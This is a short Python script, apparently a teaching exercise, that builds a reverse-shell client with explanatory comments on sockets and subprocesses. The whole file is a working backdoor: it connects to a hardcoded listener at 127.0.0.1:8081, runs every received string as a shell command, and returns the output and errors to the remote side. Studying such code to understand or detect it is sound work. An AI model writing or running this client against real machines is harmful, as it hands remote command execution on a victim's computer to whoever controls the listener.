# A socket is one of the ways that two programs can pass information back and forth
# A memory buffer through which one process can write data to another. The socket connects a process on your computer
#     to a process on someone else's computer.
import socket
import subprocess

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081

client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
# Above, creates a new socket object (a network connection)
# socket.AF_INET means to use IPv4, SOCK_STREAM means to use TCP (SOCK_DGRAM is used for UDP)

print("--- Connection Initiating ---")
client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    print("--- Receiving... ---")
    command = client.recv(1024)
    # Above, this receives data from the server (up to 1024 bytes)
    command = command.decode(encoding='UTF-8')
    # Above, converts the command into human-readable format (UTF-8 is the default)
    op = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Above, this executes the command that is received from the server. Popen creates a new process to run the command
    # shell=true means we run the command in either cmd.exe or /bin/sh
    # stdout=subprocess.PIPE captures standard output and stderr captures the standard error
    output = op.stdout.read()
    # Above, reads the output of the command
    output_error = op.stderr.read()
    # Above, reads the error of the command (if any)
    print("Sending response...")
    client.send(output + output_error)
    # Above, sends the output and potential error back to the server

